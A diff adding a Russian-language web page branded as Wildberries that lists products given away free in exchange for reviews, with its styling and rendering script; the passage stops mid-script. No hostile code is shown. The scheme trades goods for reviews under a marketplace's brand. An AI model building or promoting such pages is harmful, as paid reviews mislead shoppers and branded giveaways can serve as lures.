@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wildberries — Товары за отзыв</title>
+    <style>
+        :root {
+            --bg-primary: #0d0d0d;
+            --bg-secondary: #1a1a1a;
+            --bg-tertiary: #262626;
+            --bg-card: #1e1e1e;
+            --text-primary: #ffffff;
+            --text-secondary: #b3b3b3;
+            --text-muted: #666666;
+            --accent: #cb11ab;
+            --accent-light: #e313bf;
+            --accent-dark: #a00e8a;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --border: #333333;
+            --shadow: rgba(0, 0, 0, 0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 16px;
+            backdrop-filter: blur(20px);
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--accent), var(--accent-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .city-selector {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            background: var(--bg-tertiary);
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background 0.2s;
+            border: 1px solid var(--border);
+        }
+
+        .city-selector:active {
+            background: var(--border);
+        }
+
+        .city-icon {
+            width: 16px;
+            height: 16px;
+            color: var(--accent);
+            flex-shrink: 0;
+        }
+
+        .city-name {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-primary);
+            max-width: 140px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .city-arrow {
+            width: 14px;
+            height: 14px;
+            color: var(--text-muted);
+            transition: transform 0.2s;
+            flex-shrink: 0;
+        }
+
+        .city-selector.open .city-arrow {
+            transform: rotate(180deg);
+        }
+
+        .search-box {
+            position: relative;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .search-input:focus {
+            border-color: var(--accent);
+        }
+
+        .search-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            color: var(--text-muted);
+        }
+
+        .city-dropdown {
+            position: fixed;
+            inset: 0;
+            background: var(--bg-primary);
+            z-index: 200;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .city-dropdown.open {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .city-dropdown-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            background: var(--bg-secondary);
+            flex-shrink: 0;
+        }
+
+        .city-dropdown-title {
+            font-size: 17px;
+            font-weight: 700;
+        }
+
+        .city-dropdown-close {
+            width: 36px;
+            height: 36px;
+            background: var(--bg-tertiary);
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+
+        .city-search-box {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .city-search-input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            outline: none;
+        }
+
+        .city-search-input:focus {
+            border-color: var(--accent);
+        }
+
+        .city-search-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .city-search-icon {
+            position: absolute;
+            left: 28px;
+            top: 22px;
+            width: 18px;
+            height: 18px;
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+
+        .city-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 0 20px;
+        }
+
+        .city-region-header {
+            padding: 12px 16px 6px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: sticky;
+            top: 0;
+            background: var(--bg-primary);
+            z-index: 1;
+        }
+
+        .city-item {
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: background 0.15s;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 15px;
+        }
+
+        .city-item:last-child {
+            border-bottom: none;
+        }
+
+        .city-item:active {
+            background: var(--bg-tertiary);
+        }
+
+        .city-item.active {
+            color: var(--accent);
+        }
+
+        .city-item.active::after {
+            content: '✓';
+            font-weight: 700;
+        }
+
+        .city-no-results {
+            padding: 40px 20px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 15px;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 8px;
+            padding: 12px 16px;
+            overflow-x: auto;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+            border-bottom: 1px solid var(--border);
+            background: var(--bg-primary);
+        }
+
+        .tabs::-webkit-scrollbar {
+            display: none;
+        }
+
+        .tab {
+            flex-shrink: 0;
+            padding: 8px 16px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .tab.active {
+            background: var(--accent);
+            border-color: var(--accent);
+            color: white;
+        }
+
+        .tab:active {
+            transform: scale(0.95);
+        }
+
+        .products-container {
+            padding: 16px;
+            padding-bottom: 30px;
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        @media (min-width: 480px) {
+            .products-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .product-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            position: relative;
+        }
+
+        .product-card:active {
+            transform: scale(0.98);
+        }
+
+        .product-image-wrap {
+            position: relative;
+            aspect-ratio: 1;
+            overflow: hidden;
+            background: var(--bg-tertiary);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s;
+        }
+
+        .product-card:hover .product-image {
+            transform: scale(1.05);
+        }
+
+        .product-badge {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: var(--accent);
+            color: white;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 4px 8px;
+            border-radius: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .product-fav {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 32px;
+            height: 32px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            cursor: pointer;
+            backdrop-filter: blur(4px);
+        }
+
+        .product-fav svg {
+            width: 18px;
+            height: 18px;
+            color: white;
+        }
+
+        .product-fav.active svg {
+            fill: var(--accent);
+            color: var(--accent);
+        }
+
+        .product-info {
+            padding: 12px;
+        }
+
+        .product-price {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .product-price span {
+            font-size: 13px;
+            font-weight: 400;
+            color: var(--text-muted);
+            text-decoration: line-through;
+            margin-left: 6px;
+        }
+
+        .product-name {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 10px;
+            min-height: 36px;
+        }
+
+        .product-meta {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .meta-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+        }
+
+        .meta-icon {
+            width: 14px;
+            height: 14px;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+
+        .meta-text {
+            color: var(--text-secondary);
+        }
+
+        .meta-text.accent {
+            color: var(--accent-light);
+            font-weight: 600;
+        }
+
+        .seller-name {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid var(--border);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            width: 100%;
+            max-height: 90vh;
+            border-radius: 24px 24px 0 0;
+            transform: translateY(100%);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .modal-close {
+            width: 36px;
+            height: 36px;
+            background: var(--bg-tertiary);
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-primary);
+        }
+
+        .modal-body {
+            overflow-y: auto;
+            flex: 1;
+            padding: 0 16px 24px;
+        }
+
+        .modal-image-gallery {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding: 16px 0;
+            scrollbar-width: none;
+        }
+
+        .modal-image-gallery::-webkit-scrollbar {
+            display: none;
+        }
+
+        .modal-image-main {
+            width: 280px;
+            height: 280px;
+            border-radius: 16px;
+            object-fit: cover;
+            flex-shrink: 0;
+            background: var(--bg-tertiary);
+        }
+
+        .modal-details {
+            padding: 8px 0;
+        }
+
+        .modal-price-row {
+            display: flex;
+            align-items: baseline;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .modal-price {
+            font-size: 28px;
+            font-weight: 800;
+        }
+
+        .modal-price-old {
+            font-size: 16px;
+            color: var(--text-muted);
+            text-decoration: line-through;
+        }
+
+        .modal-discount {
+            background: var(--accent);
+            color: white;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 8px;
+            border-radius: 8px;
+        }
+
+        .modal-product-name {
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .modal-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .stat-box {
+            background: var(--bg-tertiary);
+            border-radius: 12px;
+            padding: 14px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .stat-value {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--accent-light);
+            margin-bottom: 4px;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .seller-card {
+            background: var(--bg-tertiary);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .seller-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .seller-info {
+            flex: 1;
+        }
+
+        .seller-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .seller-rating {
+            font-size: 12px;
+            color: var(--warning);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .reviews-section {
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .review-count {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+
+        .review-card {
+            background: var(--bg-tertiary);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 10px;
+            border: 1px solid var(--border);
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .review-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--bg-secondary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--accent-light);
+        }
+
+        .review-author {
+            flex: 1;
+        }
+
+        .review-name {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .review-date {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .review-rating {
+            color: var(--warning);
+            font-size: 14px;
+        }
+
+        .review-text {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+        }
+
+        .review-photos {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            scrollbar-width: none;
+        }
+
+        .review-photos::-webkit-scrollbar {
+            display: none;
+        }
+
+        .review-photo {
+            width: 100px;
+            height: 100px;
+            border-radius: 10px;
+            object-fit: cover;
+            flex-shrink: 0;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .review-photo:active {
+            transform: scale(0.95);
+        }
+
+        .modal-footer {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            gap: 10px;
+            flex-shrink: 0;
+            background: var(--bg-secondary);
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            color: white;
+        }
+
+        .btn-secondary {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+        }
+
+        .photo-viewer {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .photo-viewer.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .photo-viewer img {
+            max-width: 95%;
+            max-height: 85vh;
+            border-radius: 8px;
+            object-fit: contain;
+        }
+
+        .photo-viewer-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            border-radius: 50%;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-muted);
+        }
+
+        .empty-state svg {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px;
+            opacity: 0.5;
+        }
+
+        .empty-state h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid var(--border);
+            z-index: 3000;
+            opacity: 0;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--bg-primary);
+            z-index: 5000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .loading-overlay.hidden {
+            display: none;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--border);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Загрузка данных...</div>
+    </div>
+
+    <header class="header">
+        <div class="header-top">
+            <img src="img/logo.png" alt="WB Отзывы" style="height: 40px; width: auto; object-fit: contain;">
+            <div class="city-selector" id="citySelector" onclick="openCityModal()">
+                <svg class="city-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
+                </svg>
+                <span class="city-name" id="currentCity">Москва</span>
+                <svg class="city-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                </svg>
+            </div>
+        </div>
+        <div class="search-box">
+            <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+            </svg>
+            <input type="text" class="search-input" placeholder="Поиск товаров за отзыв..." id="searchInput" oninput="filterProducts()">
+        </div>
+    </header>
+
+    <div style="padding: 16px; background: linear-gradient(135deg, rgba(203,17,171,0.1), rgba(203,17,171,0.05)); border-bottom: 1px solid var(--border);">
+        <p style="font-size: 14px; line-height: 1.6; color: var(--text-secondary); margin: 0;">
+            Здесь собраны продавцы которые готовы отправить свой товар ради отзыва.
+        </p>
+        <p style="font-size: 14px; line-height: 1.6; color: var(--text-secondary); margin: 8px 0 0 0;">
+            Отзывы помогают начинающим продавцам пробиться среди тысяч конкурентов — а вам дают возможность протестировать новинки без всяких затрат.
+        </p>
+    </div>
+
+
+
+    <div class="city-dropdown" id="cityDropdown">
+        <div class="city-dropdown-header">
+            <div class="city-dropdown-title">Выберите город</div>
+            <button class="city-dropdown-close" onclick="closeCityModal()">✕</button>
+        </div>
+        <div class="city-search-box" style="position: relative;">
+            <svg class="city-search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+            </svg>
+            <input type="text" class="city-search-input" placeholder="Поиск города..." id="citySearchInput" oninput="filterCities()">
+        </div>
+        <div class="city-list" id="cityList"></div>
+    </div>
+
+    <div class="tabs" id="tabsContainer">
+        <div class="tab active" onclick="setCategory('all')">Все</div>
+        <div class="tab" onclick="setCategory('electronics')">Электроника</div>
+        <div class="tab" onclick="setCategory('home')">Дом</div>
+        <div class="tab" onclick="setCategory('beauty')">Красота</div>
+        <div class="tab" onclick="setCategory('kids')">Детям</div>
+        <div class="tab" onclick="setCategory('sport')">Спорт</div>
+    </div>
+
+    <div class="products-container">
+        <div class="products-grid" id="productsGrid"></div>
+    </div>
+
+    <div class="modal-overlay" id="productModal" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="modal-title">О товаре</div>
+                <button class="modal-close" onclick="closeModal()">✕</button>
+            </div>
+            <div class="modal-body" id="modalBody"></div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">Закрыть</button>
+                <button class="btn btn-primary" onclick="requestProduct()">Получить за отзыв</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="photo-viewer" id="photoViewer" onclick="closePhotoViewer()">
+        <button class="photo-viewer-close">✕</button>
+        <img src="" alt="" id="photoViewerImg">
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        let citiesData = [];
+        let productsData = [];
+        let currentCity = 'Москва';
+        let currentCategory = 'all';
+        let searchQuery = '';
+        let favorites = new Set();
+        let citySearchQuery = '';
+
+        async function loadData() {
+            try {
+                const [citiesRes, productsRes] = await Promise.all([
+                    fetch('russia.json'),
+                    fetch('products.json')
+                ]);
+
+                if (citiesRes.ok) {
+                    citiesData = await citiesRes.json();
+                    citiesData.sort((a, b) => a.city.localeCompare(b.city, 'ru'));
+                } else {
+                    citiesData = [{ region: "Москва и Московская обл.", city: "Москва" }];
+                }
+
+                if (productsRes.ok) {
+                    productsData = await productsRes.json();
+                } else {
+                    productsData = [];
+                }
+            } catch (e) {
+                console.error('Failed to load data:', e);
+                citiesData = [{ region: "Москва и Московская обл.", city: "Москва" }];
+                productsData = [];
+            }
+
+            document.getElementById('loadingOverlay').classList.add('hidden');
+            renderCities();
+            renderProducts();
+        }
+
+        function renderCities() {
+            const list = document.getElementById('cityList');
+            const query = citySearchQuery.toLowerCase().trim();
+
+            let filtered = citiesData;
+            if (query) {
+                filtered = citiesData.filter(c =>
+                    c.city.toLowerCase().includes(query) ||
+                    c.region.toLowerCase().includes(query)
+                );
+            }
+
+            if (filtered.length === 0) {
+                list.innerHTML = '<div class="city-no-results">Город не найден</div>';
+                return;
+            }
+
+            const grouped = filtered.reduce((acc, item) => {
+                if (!acc[item.region]) acc[item.region] = [];
+                acc[item.region].push(item.city);
+                return acc;
+            }, {});
+
+            let html = '';
+            for (const [region, cities] of Object.entries(grouped)) {
+                html += `<div class="city-region-header">${region}</div>`;
+                for (const city of cities) {
+                    html += `<div class="city-item ${city === currentCity ? 'active' : ''}" onclick="selectCity('${city}')">${city}</div>`;
+                }
+            }
+            list.innerHTML = html;
+        }
+
+        function openCityModal() {
+            document.getElementById('cityDropdown').classList.add('open');
+            document.body.style.overflow = 'hidden';
+            setTimeout(() => {
+                document.getElementById('citySearchInput').focus();
+            }, 100);
+        }
+
+        function closeCityModal() {
+            document.getElementById('cityDropdown').classList.remove('open');
+            document.body.style.overflow = '';
+            citySearchQuery = '';
+            document.getElementById('citySearchInput').value = '';
+            renderCities();
+        }
+
+        function filterCities() {
+            citySearchQuery = document.getElementById('citySearchInput').value;
+            renderCities();
+        }
+
+        function selectCity(city) {
+            currentCity = city;
+            document.getElementById('currentCity').textContent = city;
+            renderCities();
+            closeCityModal();
+            showToast(`Город изменён на ${city}`);
+        }
+
+        function setCategory(category) {
+            currentCategory = category;
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            event.target.classList.add('active');
+            renderProducts();
+        }
+
+        function filterProducts() {
+            searchQuery = document.getElementById('searchInput').value.toLowerCase();
+            renderProducts();
+        }
+
+        function toggleFavorite(e, id) {
+            e.stopPropagation();
+            if (favorites.has(id)) {
+                favorites.delete(id);
+                showToast('Удалено из избранного');
+            } else {
+                favorites.add(id);
+                showToast('Добавлено в избранное');
+            }
+            renderProducts();
+        }
+
+        function renderProducts() {
+            const grid = document.getElementById('productsGrid');
+            let filtered = productsData;
+
+            if (currentCategory !== 'all') {
+                filtered = filtered.filter(p => p.category === currentCategory);
+            }
+
+            if (searchQuery) {
+                filtered = filtered.filter(p => p.name.toLowerCase().includes(searchQuery));
+            }
+
+            if (filtered.length === 0) {
+                grid.innerHTML = `
+                    <div class="empty-state" style="grid-column: 1/-1;">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                        </svg>
+                        <h3>Ничего не найдено</h3>
+                        <p>Попробуйте изменить параметры поиска</p>
+                    </div>
+                `;
+                return;
+            }
+
+            grid.innerHTML = filtered.map(product => `
+                <div class="product-card" onclick="openProduct(${product.id})">
+                    <div class="product-image-wrap">
+                        <img src="${product.image}" alt="${product.name}" class="product-image" loading="lazy">
+                        <div class="product-badge">За отзыв</div>
+                        <button class="product-fav ${favorites.has(product.id) ? 'active' : ''}" 
+                                onclick="toggleFavorite(event, ${product.id})">
+                            <svg fill="${favorites.has(product.id) ? 'currentColor' : 'none'}" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="product-info">
+                        <div class="product-price">0 ₽ <span>${product.oldPrice} ₽</span></div>
+                        <div class="product-name">${product.name}</div>
+                        <div class="product-meta">
+                            <div class="meta-row">
+                                <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/>
+                                </svg>
+                                <span class="meta-text">${product.reviewsCount} отзывов</span>
+                            </div>
+                            <div class="meta-row">
+                                <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
+                                </svg>
+                                <span class="meta-text accent">Осталось: ${product.availableCount} шт.</span>
+                            </div>
+                        </div>
+                        <div class="seller-name">${product.seller}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        let currentProductId = null;
+
+        function openProduct(id) {
+            currentProductId = id;
+            const product = productsData.find(p => p.id === id);
+            if (!product) return;
+
+            const modalBody = document.getElementById('modalBody');
+            modalBody.innerHTML = `
+                <div class="modal-image-gallery">
+                    ${product.images.map(img => `
+                        <img src="${img}" class="modal-image-main" alt="" onclick="openPhotoViewer('${img}')">
+                    `).join('')}
+                </div>
+                <div class="modal-details">
+                    <div class="modal-price-row">
+                        <div class="modal-price">0 ₽</div>
+                        <div class="modal-price-old">${product.oldPrice} ₽</div>
+                        <div class="modal-discount">-100%</div>
+                    </div>
+                    <div class="modal-product-name">${product.name}</div>
+                    <div class="modal-stats">
+                        <div class="stat-box">
+                            <div class="stat-value">${product.reviewsCount}</div>
+                            <div class="stat-label">Отзывов</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value">${product.availableCount}</div>
+                            <div class="stat-label">В наличии</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value">${product.sellerRating}</div>
+                            <div class="stat-label">Рейтинг</div>
+                        </div>
+                    </div>
+                    <div class="seller-card">
+                        <div class="seller-avatar">${product.seller.charAt(0)}</div>
+                        <div class="seller-info">
+                            <div class="seller-title">${product.seller}</div>
+                            <div class="seller-rating">
+                                <span>★</span> ${product.sellerRating} · Надёжный продавец
+                            </div>
+                        </div>
+                    </div>
+                    <div class="reviews-section">
+                        <div class="section-title">
+                            Отзывы покупателей
+                            <span class="review-count">${product.reviews.length}</span>
+                        </div>
+                        ${product.reviews.map(review => `
+                            <div class="review-card">
+                                <div class="review-header">
+                                    <div class="review-avatar">${review.author.charAt(0)}</div>
+                                    <div class="review-author">
+                                        <div class="review-name">${review.author}</div>
+                                        <div class="review-date">${review.date}</div>
+                                    </div>
+                                    <div class="review-rating">${'★'.repeat(review.rating)}${'☆'.repeat(5 - review.rating)}</div>
+                                </div>
+                                <div class="review-text">${review.text}</div>
+                                ${review.photos.length > 0 ? `
+                                    <div class="review-photos">
+                                        ${review.photos.map(photo => `
+                                            <img src="${photo}" class="review-photo" alt="" onclick="openPhotoViewer('${photo}')">
+                                        `).join('')}
+                                    </div>
+                                ` : ''}
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('productModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal(event) {
+            if (event && event.target !== event.currentTarget) return;
+            document.getElementById('productModal').classList.remove('active');
+            document.body.style.overflow = '';
+            currentProductId = null;
+            // Restore footer buttons
+            const footer = document.querySelector('.modal-footer');
+            if (footer) footer.style.display = 'flex';
+        }
+
+        function openPhotoViewer(src) {
+            const viewer = document.getElementById('photoViewer');
+            const img = document.getElementById('photoViewerImg');
+            img.src = src.replace('w=200', 'w=800').replace('h=200', 'h=800');
+            viewer.classList.add('active');
+        }
+
+        function closePhotoViewer() {
